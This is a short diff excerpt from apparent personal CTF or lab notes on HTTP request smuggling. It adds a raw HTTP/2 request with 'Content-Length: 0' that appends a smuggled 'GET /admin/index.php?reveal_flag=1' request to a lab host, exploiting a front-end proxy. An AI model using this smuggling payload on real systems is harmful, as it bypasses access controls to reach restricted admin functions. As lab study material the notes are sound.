@@ -119,6 +119,15 @@ dummy:
 
 the proxy read the content correct with no need for header , so we only add CL or TE and give it the faulty length 0 , 
 remember to end the request body after the dummy: header dont add newlines so the new request is appended to the header
+
+```
+GET / HTTP/2
+Host: 154.57.164.71:30153
+Content-Length: 0
+
+GET /admin/index.php?reveal_flag=1 HTTP/1.1
+dump: 
+```
 ### Injection Points
 
 > [!example] Header Value Injection
